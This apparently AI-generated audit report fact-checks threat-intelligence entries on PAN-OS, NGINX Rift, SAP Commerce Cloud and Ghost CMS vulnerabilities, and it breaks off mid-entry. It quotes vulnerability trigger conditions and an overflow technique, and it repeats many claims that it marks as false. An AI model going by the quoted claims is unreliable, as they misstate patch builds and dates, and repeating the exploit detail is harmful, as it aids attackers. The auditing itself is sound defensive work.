**Model:** Sonnet 5.5 (`claude-sonnet-5-5`)
**Timestamps:** started_at=2026-10-18T13:28:24Z · ended_at=2026-10-18T14:12:27Z · duration_seconds=2643

## Retrospective truth pass, batch D3, run 2026-10-18T1307Z-audit

Entries: 16 checked, clean 0, imprecision 4, factual-error 12. Claims: 373 in scope, 373 with a verdict (ok 291, F3 9, F4 62, F5 5, F13 2, F14 1, unreadable 3). Group records (7 groups, 9 records) are in `truth-D3.yaml` under `groups:`.

### 2026-05-12/palo-alto-pan-os-cve-2026-0300-first-wave-fixed-builds-now-s — factual-error
1. **[factual-error] actions[0]**
   - Claim: **PAN-OS CVE-2026-0300: deploy patched builds released 2026-05-13.** Apply PAN-OS 12.1.4-h5 / 12.1.7 / 11.2 / 11.1 / 10.2 hot-fix branches
   - Defect: Lists 12.1.7 among builds released 2026-05-13, but the entry's own 2026-05-13 section says 12.1.7 is 'planned 2026-05-28' and the PSIRT page still labels it '(ETA: 05/28)' today; only 12.1.4-h5 of the 12.1 line was on the 05/13 wave.
   - Ground truth: PSIRT Product Status: 'PAN-OS 12.1 | < 12.1.4-h5 < 12.1.7 | >= 12.1.4-h5 >= 12.1.7 (ETA: 05/28)'. Rapid7 ETR Fix ETA column for 12.1: '05/13 05/28'. (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Name the 05/13-wave builds per branch (12.1.4-h5, 11.2.7-h13, 11.2.10-h6, 11.1.4-h33, 11.1.6-h32, 11.1.10-h25, 11.1.13-h5, 10.2.10-h36, 10.2.18-h6) and drop 12.1.7, or say '12.1.7 follows with the 05/28 wave'.
2. **[imprecision] ## Update — 2026-05-13T05:00:13Z (and its record summary)**
   - Claim: (Palo Alto Networks PSIRT, last updated 2026-05-07; patch table confirmed 2026-05-13)
   - Defect: Citation parenthetical contradicts the vendor page: the PSIRT timeline records updates on 2026-05-13 (16:00Z), 05-14, 05-16 and 05-28; the section is stamped 05:00:13Z on 05-13, i.e. before the vendor's 05-13 'Updated the release timeline and Solution table', so 'patch table confirmed 2026-05-13' was not yet checkable at that time (the day-level fact, first wave published 2026-05-13, is true per Rapid7 and the KEV note).
   - Ground truth: PSIRT timeline: '2026-05-13 Updated the release timeline and Solution table.' (data-date 2026-05-13T16:00:00Z); Rapid7: 'As of May 13, 2026, the first round of patches has been published.' (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Cite the 2026-05-13 vendor revision and the KEV 5/13 note instead of 'last updated 2026-05-07'.
3. **[imprecision] body para 2 and 2026-05-13 section**
   - Claim: the interim Threat Prevention signature **510019** ... remain the only defender controls for branches that do not yet have a fixed build / Threat Prevention signature ID 510019 remains the interim control for any unpatched instance
   - Defect: Omits the vendor's qualifier that Threat ID 510019 needs PAN-OS 11.1 or later, so it is not a control for unpatched 10.2 instances (10.2.7-h34, 10.2.13-h21, 10.2.16-h7 were wave-2 builds).
   - Ground truth: 'Customers with a Threat Prevention subscription can block attacks for this vulnerability by enabling Threat ID 510019 from Applications and Threats content version 9097-10022. Decoder capabilities necessitate PAN-OS 11.1 or a later version for Threat ID support.' (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Add 'PAN-OS 11.1+ only; content 9097-10022 or later'.
4. **[imprecision] body para 1**
   - Claim: the ~2026-04-09 first-observed-exploitation date come from Unit 42's separate [Captive Portal Zero-Day threat bulletin]
   - Defect: Unit 42 says April 9 was the start of UNSUCCESSFUL exploitation attempts against one device; successful RCE came about a week later.
   - Ground truth: 'Starting April 9, 2026, there were unsuccessful exploitation attempts against a PAN-OS device. A week later, the attackers successfully achieved RCE against the device and injected shellcode.' (https://unit42.paloaltonetworks.com/captive-portal-zero-day/)
   - Fix: Say 'first exploitation attempts ~2026-04-09, first successful RCE ~a week later'.
5. **[imprecision] summary / headline**
   - Claim: first-wave fixed builds now scheduled for 2026-05-13 ... exploitation clusters have been actively abusing
   - Defect: 'now scheduled' frames as new a schedule that was in the advisory from initial publication on 2026-05-05/06 (per-build Fix ETA 05/13 and 05/28); 'clusters' plural while Unit 42 names one cluster, CL-STA-1132.
   - Ground truth: Rapid7 (pub 2026-05-06): 'fixed versions are expected to begin rolling out on May 13, 2026, with additional releases through May 28, 2026' with a per-build Fix ETA table; Unit 42: 'tracking CL-STA-1132, a cluster of likely state-sponsored threat activity'. (https://rapid7.com/blog/post/etr-critical-buffer-overflow-in-palo-alto-networks-pan-os-user-id-authentication-portal-cve-2026-0300)
   - Fix: Drop 'now'/'clusters'; this is the same finding as the 05-08 entry, an unchanged ETA.
6. **[imprecision] frontmatter**
   - Claim: classification: null; techniques: []; affected_products: []; cves[].affected/fixed: null
   - Defect: Migrated entry carries no Admiralty classification, no ATT&CK mapping (exploit of public-facing application is described) and no structured affected/fixed versions although the PSIRT table states them per branch.
   - Ground truth: PSIRT CVE JSON: PAN-OS affected 12.1.0 <12.1.7, 11.2.0 <11.2.12, 11.1.0 <11.1.15, 10.2.0 <10.2.18-h6 (per-hotfix-train fixes in the Solution table); CNA names PA-Series and VM-Series firewalls. (https://security.paloaltonetworks.com/json/CVE-2026-0300)
   - Fix: Populate classification (reliability A/B vendor + corroborating Unit 42), techniques[] (T1190 etc.), affected_products and cves[].affected/fixed on the survivor entry.

### 2026-05-14/cve-2026-0300-pan-os-captive-portal-patch-wave-2-delayed-to — factual-error
1. **[factual-error] title / headline / summary**
   - Claim: patch wave 2 delayed to 2026-05-28 for eight high-traffic build streams
   - Defect: No source shows a delay: the 05/28 ETA for exactly these eight builds was in the advisory from initial publication (and the 2026-05-12 entry already reported the second wave around 2026-05-28). 'high-traffic' is also unsourced.
   - Ground truth: Rapid7 ETR (pub 2026-05-06, updated 2026-05-13) Fix ETA: 12.1.7 05/28; 11.2.4-h17 05/28, 11.2.12 05/28; 11.1.7-h6 05/28, 11.1.15 05/28; 10.2.7-h34 05/28, 10.2.13-h21 05/28, 10.2.16-h7 05/28; PSIRT timeline has no 'delayed' entry on 2026-05-13 ('Updated the release timeline and Solution table'). (https://rapid7.com/blog/post/etr-critical-buffer-overflow-in-palo-alto-networks-pan-os-user-id-authentication-portal-cve-2026-0300)
   - Fix: Retitle as an unchanged second-wave ETA (or fold into the survivor as a changelog line): 'first wave published 2026-05-13; eight fix builds still ETA 05/28'.
2. **[factual-error] body para 1**
   - Claim: PSIRT updated its CVE-2026-0300 advisory on 2026-05-13 to reflect first-wave patch availability but to also disclose a **second patch wave with an ETA of 2026-05-28** for eight commonly-deployed build streams
   - Defect: The second-wave ETAs were not disclosed on 2026-05-13; they were published with the advisory on 2026-05-05/06. 'commonly-deployed' unsourced.
   - Ground truth: Rapid7 (pub 2026-05-06): 'No patches are currently available; fixed versions are expected to begin rolling out on May 13, 2026, with additional releases through May 28, 2026.' (https://rapid7.com/blog/post/etr-critical-buffer-overflow-in-palo-alto-networks-pan-os-user-id-authentication-portal-cve-2026-0300)
   - Fix: Say the 2026-05-13 revision confirmed first-wave availability while the eight 05/28 ETAs stood unchanged.
3. **[imprecision] body para 1**
   - Claim: Operators running any of those builds cannot patch yet; the interim mitigation ... is the only option until 28 May.
   - Defect: The eight listed versions are the FIXED target builds awaiting release (operators cannot run them yet); the sentence should speak of operators whose branch fix is one of those builds. On other maintenance trains fixes were already out (e.g. 10.2.10-h36, 11.2.7-h13, 11.1.13-h5).
   - Ground truth: PSIRT 10.2 row: '>= 10.2.13-h21' listed under Unaffected; Solution: '10.2.11 through 10.2.13-h* Upgrade to 10.2.13-h21 or 10.2.18-h6 or later.' (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Reword: 'Operators on trains whose only listed fix is one of these builds (and who cannot jump to a later available fix) remain mitigation-only until 05/28.'
4. **[imprecision] body para 2**
   - Claim: were not independently corroborated by HIGH-reliability third-party reporting in window
   - Defect: Third-party reporting did reproduce the vendor's per-build ETA table (Rapid7, Censys), so the non-corroboration statement is inaccurate.
   - Ground truth: Censys: 'Roughly half of the fixed builds are scheduled for May 13, 2026 and the remaining builds for May 28, 2026.' Rapid7 table with per-build ETAs. (https://censys.com/advisory/cve-2026-0300/)
   - Fix: Drop the sentence or cite Rapid7 as corroboration.
5. **[imprecision] summary / body**
   - Claim: CL-STA-1132 in-the-wild exploitation continues
   - Defect: No cited source post-dates 2026-05-08 reporting; 'continues' is an inference, and Unit 42's 'continues' is not stated.
   - Ground truth: Unit 42 (published 2026-05-06/07, modified 2026-05-08): 'We are aware of only limited exploitation of CVE-2026-0300 at this time.' (https://unit42.paloaltonetworks.com/captive-portal-zero-day/)
   - Fix: Say 'limited exploitation (CL-STA-1132) was reported at disclosure' without asserting continuation.
6. **[imprecision] frontmatter**
   - Claim: verification: single-source; no classification; no techniques[]; affected/fixed null
   - Defect: Two vendor sources are cited yet verification says single-source; classification missing; techniques missing.
   - Ground truth: Entry cites PSIRT (primary) and Unit 42 (corroborating). (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Resolve on the survivor entry.

### 2026-05-18/cve-2026-0300-pan-os-captive-portal-revised-fix-release-time — factual-error
1. **[factual-error] actions[0] and body para 2 'Defender action'**
   - Claim: if any device runs `10.2.13-h21` or `10.2.16-h7`, confirm Captive Portal / User-ID Authentication Portal mitigation remains active and track the wave-2 patch target (2026-05-28)
   - Defect: Inverted: 10.2.13-h21 and 10.2.16-h7 are the FIXED builds (affected is '< 10.2.13-h21' / '< 10.2.16-h7'), so a device on them is not affected and has no wave-2 wait. 'Apply the published Threat Prevention rule' is also unavailable on any PAN-OS 10.2 build (needs 11.1+).
   - Ground truth: PSIRT Product Status 10.2: 'Affected < 10.2.7-h34 < 10.2.10-h36 < 10.2.13-h21 < 10.2.16-h7 < 10.2.18-h6 | Unaffected >= 10.2.7-h34 >= 10.2.10-h36 >= 10.2.13-h21 >= 10.2.16-h7 >= 10.2.18-h6'; 'Decoder capabilities necessitate PAN-OS 11.1 or a later version for Threat ID support.' (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Rewrite: 10.2 devices below 10.2.13-h21 / 10.2.16-h7 (on those trains) stay mitigation-only until those fixes ship; devices on or above them are fixed.
2. **[factual-error] body para 1**
   - Claim: PA-Series and VM-Series devices on those two specific builds remain mitigation-only. / wave-2 target remains 2026-05-28
   - Defect: The PSIRT only records that the fix release timeline for 10.2.16-h7 (05-14) and 10.2.13-h21 (05-16) was updated; the entry never states the new date, yet asserts the wave-2 target 'remains' 05-28 for them. Today both are listed as fixed builds with no ETA, while the 05-28 update names only 11.1.15, 11.1.7-h6, 11.2.4-h17 and 11.2.12. 'commonly deployed LTS branches in large enterprise and government estates' is unsourced.
   - Ground truth: Timeline: '2026-05-16 Updated the Fix release timeline for 10.2.13-h21.' '2026-05-14 Updated the Fix release timeline for 10.2.16-h7.' '2026-05-28 Updated the Fix release timeline for 11.1.15, 11.1.7-h6, 11.2.4-h17 and 11.2.12.' (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: State only what the timeline supports (fix timeline for those two builds revised 05-14/05-16, new dates not disclosed in the page text) and drop the LTS/government-estate sentence and the 'remain mitigation-only' assertion.
3. **[factual-error] frontmatter cves[0].status**
   - Claim: status: [exploited, cisa-kev, mitigation-only]
   - Defect: By 2026-05-18 fixed builds were available for most trains (first wave published 2026-05-13); the status omits patch-available and presents the CVE as mitigation-only.
   - Ground truth: KEV requiredAction: '5/13/2026: Palo Alto has released a variety of patches.'; Rapid7: 'As of May 13, 2026, the first round of patches has been published.' (https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
   - Fix: Add patch-available; keep mitigation-only only if tied to the still-unreleased builds.
4. **[factual-error] body para 2**
   - Claim: the actively-exploited posture (unauthenticated heap overflow in the User-ID Authentication Portal / Captive Portal service, CVSS 9.3, pre-auth root RCE)
   - Defect: No source calls it a heap overflow; the vendor says buffer overflow (CWE-787 out-of-bounds write).
   - Ground truth: PSIRT: 'A buffer overflow vulnerability in the User-ID Authentication Portal (aka Captive Portal) service ... allows an unauthenticated attacker to execute arbitrary code with root privileges'; KEV name 'Out-of-bounds Write Vulnerability'. (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Replace 'heap overflow' with 'buffer overflow (CWE-787)'.
5. **[imprecision] frontmatter**
   - Claim: entities: []; no classification; no techniques[]; summary begins 'UPDATE (originally covered 2026-05-07 deep dive)'; verification: single-source
   - Defect: Migration artefacts: no classification, no techniques, no entity link to campaign:cl-sta-1132 (not mentioned in the body either), update narrative with no target entry; a revised ETA with no new date is a non-event.
   - Ground truth: Same finding as the other CVE-2026-0300 entries; PSIRT timeline lines above. (https://security.paloaltonetworks.com/CVE-2026-0300)
   - Fix: Fold into the survivor as an improvement/internal record rather than keep as a standalone entry.

### 2026-05-15/cve-2026-42945-nginx-open-source-plus-f5-waf-products-18-yea — factual-error
1. **[factual-error] body (discovery and disclosure sentence)**
   - Claim: responsibly disclosed to F5/NGINX on 2026-04-18, with RCE PoC shared to F5/NGINX under NDA on 2026-04-28, and patches released on 2026-05-13
   - Defect: Wrong dates and an invented NDA: depthfirst's own timeline has internal discovery on 04-18, report to NGINX on 04-21, NGINX confirmation 04-24, notice on 04-28 that a working RCE PoC existed and the PoC itself shared with NGINX on 05-05; no source mentions an NDA.
   - Ground truth: depthfirst timeline: '4/18/2026: We used depthfirst's internal system ... it reported 5 memory corruption issues. 4/21/2026: We reported all 5 issues to NGINX via a GitHub security advisory. ... 4/28/2026: We informed NGINX that we had developed a working PoC demonstrating RCE. 5/5/2026: We shared our RCE PoC with NGINX'; BleepingComputer: 'discovered on April 18, 2026, and reported to the vendor on April 21'. (https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability)
   - Fix: Write: found 2026-04-18, reported to NGINX 2026-04-21, RCE PoC shared with NGINX 2026-05-05, fixes and advisory released 2026-05-13; drop 'under NDA'.
2. **[imprecision] body para 1 (cited to depthfirst and NCSC-CH)**
   - Claim: CVE-2026-42945 (CVSS 4.0: 9.2 / CVSS 3.1: 8.1, CWE-122, codename "NGINX Rift")
   - Defect: The 3.1 score 8.1 and CWE-122 are on neither cited page (they are in F5's CNA CVE record, where they are correct); adjacency gap.
   - Ground truth: F5 CNA record CVE-2026-42945: cvssV3_1 baseScore 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H), cvssV4_0 baseScore 9.2, CWE-122 'Heap-based Buffer Overflow'. (https://cveawg.mitre.org/api/cve/CVE-2026-42945)
   - Fix: Cite the F5 advisory / CVE record for 8.1 and CWE-122.
3. **[imprecision] body ('Exploitation status' and ASLR sentences)**
   - Claim: Exploitation status: no in-the-wild confirmed; ... RCE requires ASLR to be disabled on the host.
   - Defect: Stale today: VulnCheck reported exploitation attempts against honeypots (The Hacker News, 2026-05-17); F5's CVE description was later widened to 'ASLR disabled or when the attacker can bypass ASLR'. The entry was never updated; the exploited state lives only in the 2026-05-18 sibling entry.
   - Ground truth: F5 CNA description (dateUpdated 2026-09-10): 'attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.' THN: 'exploitation attempts detected against its honeypot networks.' (https://cveawg.mitre.org/api/cve/CVE-2026-42945)
   - Fix: Fold into the survivor; state exploitation attempts since ~2026-05-16/17 and the CNA's ASLR wording.
4. **[imprecision] frontmatter**
   - Claim: classification absent; techniques: []; cves[].affected/fixed null; evidence: []
   - Defect: No Admiralty rating, no ATT&CK mapping (T1190 exploit of public-facing application), no structured affected/fixed although both are stated by sources; no evidence quotes.
   - Ground truth: F5 CNA: Plus R36 <R36 P4, R32 <R32 P6; Open Source 0.6.27 <1.30.1; nginx.org: 'Not vulnerable: 1.31.0+, 1.30.1+. Vulnerable: 0.6.27-1.30.0'. (https://nginx.org/en/security_advisories.html)
   - Fix: Populate on the survivor.

### 2026-05-18/cve-2026-42945-nginx-rift-in-the-wild-exploitation-confirmed — imprecision
1. **[imprecision] body para 1**
   - Claim: The flaw is reachable by an unauthenticated remote attacker via a single crafted HTTP request to any NGINX instance running a rewrite-rule configuration that uses unnamed PCRE captures (`$1`, `$2`)
   - Defect: Overbroad trigger: exposure needs a rewrite whose replacement contains '?' and that is followed by another rewrite, if or set directive in the same scope, with an unnamed capture; unnamed captures alone are not enough (the 05-15 sibling states the full condition).
   - Ground truth: F5/GHSA: 'This vulnerability exists when the rewrite directive is followed by a rewrite, if, or set directive and an unnamed PCRE capture (for example, $1, $2) with a replacement string that includes a question mark (?).' (https://github.com/advisories/GHSA-gcgv-v5gf-c543)
   - Fix: State the three-part condition.
2. **[imprecision] body para 2 (detection anchors)**
   - Claim: correlated with inbound HTTP requests carrying unusually long or deeply-nested rewrite-rule input strings from the same source
   - Defect: No source describes 'deeply-nested rewrite-rule input strings'; the public analysis shows the overflow is driven by a request URI padded with escapable characters (plus signs, %, &) against a vulnerable rewrite; the sentence is an uncited invention (self-hedged but still wrong in kind).
   - Ground truth: depthfirst: 'By padding the request URI with plus signs, we can force the escaping function to expand each byte into three bytes, overflowing the allocated chunk.' (https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability)
   - Fix: Replace with 'requests to affected rewrite locations whose URI carries many escapable characters, followed by worker exits on signal (nginx error log) and respawn'.
3. **[imprecision] headline / summary / actions[0]**
   - Claim: VulnCheck honeypot telemetry confirms in-the-wild exploitation as of 2026-05-17
   - Defect: The cited THN piece (dated 2026-05-17) reports exploitation ATTEMPTS against VulnCheck honeypots with unknown objectives; 2026-05-17 is the article date, not a stated observation date (secondary reports put first detection on 05-16, unverified).
   - Ground truth: THN: 'threat actors have begun to weaponize the flaw, with exploitation attempts detected against its honeypot networks. The nature of the attack activity and the end goals are presently unknown.' (https://thehackernews.com/2026/05/nginx-cve-2026-42945-exploited-in-wild.html)
   - Fix: Say 'VulnCheck reported exploitation attempts against its honeypots (reported 2026-05-17)'.
4. **[imprecision] evidence[0] and frontmatter**
   - Claim: evidence quote publisher: ctipilot v2 brief (migrated); classification absent; techniques []
   - Defect: The only evidence quote is the entry's own migrated v2 text, not a source passage; no classification or ATT&CK mapping; verification multi-source with two vendor-adjacent secondary sources and no exploitation primary (VulnCheck's own report is not cited).
   - Ground truth: THN names VulnCheck's LinkedIn post as the origin; no VulnCheck page is cited. (https://thehackernews.com/2026/05/nginx-cve-2026-42945-exploited-in-wild.html)
   - Fix: Replace with a verbatim THN passage; add classification (B/2-ish) and techniques; resolve on the survivor.
5. **[imprecision] body para 2**
   - Claim: Affected per [F5 PSIRT advisory K000161019]
   - Defect: The cited F5 article is a JS shell none of extract, raw or WebFetch can render, so its content could not be checked directly; the product and version list matches NCSC-CH #12575, depthfirst and nginx.org (which names K000161019 as the CVE-2026-42945 advisory).
   - Ground truth: nginx.org: 'Buffer overflow in the ngx_http_rewrite_module ... Advisory K000161019 ... CVE-2026-42945 ... Not vulnerable: 1.31.0+, 1.30.1+ Vulnerable: 0.6.27-1.30.0'. (https://nginx.org/en/security_advisories.html)
   - Fix: None required beyond noting the F5 page is unverifiable; optionally cite nginx.org.

### 2026-08-12/sap-august-2026-cve-2026-58231-commerce-cloud-data-hub-rce — factual-error
1. **[factual-error] summary and main analysis (para 4)**
   - Claim: No exploitation is reported by any party; ... / No party reports exploitation of any of these.
   - Defect: Superseded by the entry's own 2026-08-16 update (Defused honeypot exploitation attempts 2026-08-14; NCSC-NL advisory 2026-08-15 'actively scanning'); the summary and the original analysis paragraph were not revised, so the entry contradicts itself while frontmatter says exploited / actively-exploited.
   - Ground truth: BleepingComputer 2026-08-14: 'Defused security researchers confirmed earlier today that CVE-2026-58231 is now being targeted in the wild.' NCSC-NL NCSC-2026-0302 (2026-08-15): 'Beveiligingsbedrijf Defused meldt dat kwaadwillenden actief scannen'. (https://www.bleepingcomputer.com/news/security/max-severity-sap-commerce-cloud-flaw-now-targeted-in-attacks/)
   - Fix: Rewrite the summary to state exploitation attempts since 2026-08-14 and reword 'No party reports exploitation' to the 2026-08-11 snapshot.
2. **[factual-error] body para 5 and update section; actions[0]; title**
   - Claim: an unauthenticated request to the Data Hub Adapter import endpoint ... surface requests to the Data Hub import path ... legitimate Data Hub imports arrive from a small, enumerable set of integration sources ... the adapter's import functions
   - Defect: No cited source calls the vulnerable entry point an 'import' endpoint, path or function; SAP says 'certain functions lacking sufficient validation' reachable via 'a default authentication client'. The detection guidance and the title rest on an unsourced mechanism.
   - Ground truth: SAP (via BleepingComputer): 'SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit specially crafted input to certain functions lacking sufficient validation'; Onapsis: 'restrict access to the vulnerable endpoint'. (https://www.bleepingcomputer.com/news/security/max-severity-sap-commerce-cloud-flaw-now-targeted-in-attacks/)
   - Fix: Replace 'import endpoint/path/functions' with 'the vulnerable Data Hub Adapter endpoint' and drop the 'legitimate imports come from enumerable sources' claim.
3. **[imprecision] update section 2026-08-16, para 1**
   - Claim: whoever is sending these requests built a working exploit without published research to copy, on a three-day clock
   - Defect: Sources report exploitation attempts hitting a honeypot and no public PoC; none says the sender has a working exploit.
   - Ground truth: Defused: 'First exploitation attempts against CVE-2026-58231 ... is now hitting our honeypots - 3 days after patch day ... This vulnerability has no public PoC and is not known to be exploited.' (https://www.bleepingcomputer.com/news/security/max-severity-sap-commerce-cloud-flaw-now-targeted-in-attacks/)
   - Fix: Say 'someone is probing for the flaw within three days of the fix, with no public PoC'.
4. **[imprecision] body para 2 (CVE-2026-42945 sentence)**
   - Claim: The same rebuild-and-redeploy requirement applies to CVE-2026-42945 (CVSS 8.1), a buffer overflow affecting Commerce Cloud public-cloud deployments fronted by NGINX, per SAP Security Note 3773203 ([SAP SE, 2026-08-11])
   - Defect: The cited SAP patch-day page carries the note number, title and score but not the build-and-deploy requirement, which is Onapsis's statement; also, the sentence never says this is SAP's downstream note for the upstream NGINX Rift flaw already covered (and exploited) elsewhere.
   - Ground truth: Onapsis: 'The patch is present on all SAP Commerce Cloud in the Public Cloud systems and customers can consume the patch by building and deploying their SAP Commerce Cloud applications to their environments.' (https://onapsis.com/blog/sap-security-patch-day-august-2026/)
   - Fix: Re-attribute the build-and-deploy clause to Onapsis and add that CVE-2026-42945 is the upstream NGINX Rift bug (see the NGINX entry).
5. **[imprecision] body para 2, actions[0]**
   - Claim: Commerce Cloud is the platform behind public storefronts, so the vulnerable component sits on the internet side of the estate by design
   - Defect: Inference stated as fact: no cited source says the Data Hub Adapter is internet-facing; Shadowserver counts Commerce Cloud fingerprints, not Data Hub Adapter exposure.
   - Ground truth: BleepingComputer: Shadowserver tracks 'over 4,200 IP addresses with a SAP Commerce Cloud fingerprint ... no information on how many of them are honeypots or have already been secured against CVE-2026-58231 attacks.' (https://www.bleepingcomputer.com/news/security/max-severity-sap-commerce-cloud-flaw-now-targeted-in-attacks/)
   - Fix: Hedge: 'Commerce Cloud storefronts are internet-facing; SAP does not say whether the Data Hub Adapter endpoint is'.
6. **[imprecision] actions[2]**
   - Claim: the patch alone does not remove the vulnerable servlet, and without this property the flaw remains exploitable regardless of patch status
   - Defect: Onapsis states only that customers must maintain the Secure Transformer property after patching; it does not say the flaw stays exploitable without it.
   - Ground truth: Onapsis: 'After implementing the patch, customers need to maintain the new system property Secure Transformer with a list of allowed hosts for hosting XSL files. Only XSL files from these hosts can be consumed by the vulnerable servlet.' (https://onapsis.com/blog/sap-security-patch-day-august-2026/)
   - Fix: Drop 'remains exploitable regardless of patch status' or mark it as inference.
7. **[imprecision] evidence[4] (NCSC-NL quote)**
   - Claim: Beveiligingsbedrijf Defused meldt dat kwaadwillenden actief scannen en op zoek zijn naar kwetsbare Data Hub Adapter-systemen.
   - Defect: Dutch text in the English quote field, no English translation and no original field; the passage itself is verbatim on the NCSC-NL page.
   - Ground truth: NCSC-NL advisory body: 'Beveiligingsbedrijf Defused meldt dat kwaadwillenden actief scannen en op zoek zijn naar kwetsbare Data Hub Adapter-systemen.' (https://advisories.ncsc.nl/2026/ncsc-2026-0302.html)
   - Fix: Set quote to the English translation and move the Dutch to original.

### 2026-05-25/cve-2026-26980-ghost-cms-content-api-unauthenticated-blind-s — factual-error
1. **[factual-error] body para 1**
   - Claim: the fix shipped in **6.19.1 on 19 February 2026**
   - Defect: Vendor release and advisory are dated 2026-02-16; 19 Feb is the date BleepingComputer/XLab use for public disclosure, not the release.
   - Ground truth: GitHub release v6.19.1 'Fixed SQL injection in Content API slug filter ordering' published 2026-02-16T16:54:09Z; GHSA-w52v-v783-gw97 published 2026-02-16T18:04Z; SecurityWeek: 'February 16, the day a patch was announced'. (https://github.com/TryGhost/Ghost/releases/tag/v6.19.1)
   - Fix: Write 'fixed in 6.19.1, released 2026-02-16 (CVE published 2026-02-20)'.
2. **[factual-error] body para 1**
   - Claim: Ghost **3.24.0 through 6.19.0** (a roughly three-year release range)
   - Defect: Wrong quantifier: Ghost 3.24.0 was released in July 2020, about 5.6 years before 6.19.0 (Feb 2026).
   - Ground truth: GitHub release 3.24.0 shows 'released this 10 Jul' and its linked issue #12026 was opened 2020-07-09 and closed 2020-07-10. (https://github.com/TryGhost/Ghost/releases/tag/3.24.0)
   - Fix: Drop the parenthetical or say 'roughly five and a half years of releases'.
3. **[factual-error] body para 1**
   - Claim: Ghost(Pro) cloud instances were patched server-side; self-hosted operators must upgrade themselves
   - Defect: No cited or fetched source (BleepingComputer, XLab, GHSA, SecurityWeek, SentinelOne, Ghost forum) says anything about Ghost(Pro) or server-side patching; BleepingComputer says only that 'many sites failed to install the security update'. The 'self-hosted' qualifier in the summary is likewise unsourced.
   - Ground truth: BleepingComputer: 'Although the fix for the issue was released on February 19 in Ghost CMS version 6.19.1, many sites failed to install the security update.' (https://www.bleepingcomputer.com/news/security/ghost-cms-sql-injection-flaw-exploited-in-large-scale-clickfix-campaign/)
   - Fix: Delete the Ghost(Pro) sentence and the word 'self-hosted' unless a Ghost statement is found.
4. **[factual-error] body para 2**
   - Claim: SentinelOne documented in-the-wild exploitation as early as 27 February, and XLab confirmed the present large-scale wave (700+ compromised domains) on 21 May ([XLab Qianxin, 2026-05-21])
   - Defect: The citation terminates on XLab, which never mentions SentinelOne or 27 February; the SentinelOne page itself (published and last modified 2026-02-20) contains generic vulnerability and detection text and no in-the-wild exploitation report; SecurityWeek reads it as a warning ('SentinelOne warned that the vulnerability ... can be exploited'). 700+ domains were identified by 2026-05-17; 05-21 is XLab's publication date.
   - Ground truth: SentinelOne vulnerability-database page: 'CVE-2026-26980 published to NVD 2026-02-20; Last updated 2026-02-20'; no exploitation observation. XLab timeline: '2026-05-17: Second Round of Compromised Site Enumeration Completed: 700+ victim domains confirmed'. (https://www.sentinelone.com/vulnerability-database/cve-2026-26980/)
   - Fix: Drop the SentinelOne 27-Feb exploitation claim (or cite an actual SentinelOne exploitation report), and date the 700+ count to XLab's 2026-05-17 enumeration.
5. **[imprecision] body para 1 (cited to GHSA)**
   - Claim: boolean-based blind extraction of arbitrary database contents — critically the **admin API key**, which then grants full content-management scope over articles, themes and users ([GitHub Security Advisory GHSA-w52v-v783-gw97])
   - Defect: GHSA says only 'read arbitrary data from the database' and that an attacker can 'gain access to a site's API keys'; the admin-key scope is XLab/BleepingComputer content and 'boolean-based blind' appears in no fetched source (SentinelOne: slug values concatenated into a SQL CASE ordering clause).
   - Ground truth: GHSA: 'A SQL injection vulnerability existed in Ghost's Content API that allowed unauthenticated attackers to read arbitrary data from the database.' (https://github.com/advisories/GHSA-w52v-v783-gw97)
   - Fix: Cite XLab/BleepingComputer for the admin-key scope; replace 'boolean-based blind' with 'SQL injection in the slug-filter ordering clause'.
6. **[imprecision] body para 2 (interim controls)**
   - Claim: restrict or disable the public Content API to trusted origins; the vendor mitigation targets exactly that request pattern
   - Defect: The vendor says there is no application-level workaround and that restricting key access does not mitigate; its only interim control is a reverse-proxy/WAF block on slug:[ / slug%3A%5B, which 'may break legitimate slug filter functionality'.
   - Ground truth: 'There is no application-level workaround. The Content API key is public by design, so restricting key access does not mitigate this vulnerability. As a temporary mitigation, a reverse proxy or WAF rule can be used to block Content API requests containing slug%3A%5B or slug:[ ...' (https://github.com/advisories/GHSA-w52v-v783-gw97)
   - Fix: State the WAF rule and its side effect; drop 'restrict or disable the public Content API to trusted origins'.
7. **[imprecision] frontmatter**
   - Claim: cvss: 9.4; classification absent; techniques: []; cves[].affected/fixed null; evidence quote publisher 'ctipilot v2 brief (migrated)'
   - Defect: 9.4 is GitHub's (CNA) CVSS 3.1 score and matches; NVD's own score is 7.5 (C:H/I:N/A:N) and the entry never says which is which. No Admiralty rating, no techniques, no structured affected/fixed; the evidence is the entry's own text.
   - Ground truth: NVD API: cvssMetricV31 security-advisories@github.com 9.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L); nvd@nist.gov 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N). Not in CISA KEV (catalogue of 2026-10-16). (https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-26980)
   - Fix: Name the scorer ('9.4 per GitHub CNA; NVD 7.5'), set affected 3.24.0 to 6.19.0 and fixed 6.19.1, add classification and techniques.

### 2026-05-25/ghost-cms-cve-2026-26980-clickfix-the-cms-compromise-to-endp — factual-error
1. **[factual-error] summary / body para 1 (Background)**
   - Claim: CVE-2026-26980 was disclosed and patched in Ghost 6.19.1 on 19 February 2026, and SentinelOne reported in-the-wild exploitation and detection guidance by 27 February ([BleepingComputer, 2026-05-24])
   - Defect: Repeats BleepingComputer's dates against the vendor record: release and advisory 2026-02-16 (CVE published 2026-02-20). The SentinelOne page BleepingComputer links is dated 2026-02-20 and holds no exploitation report.
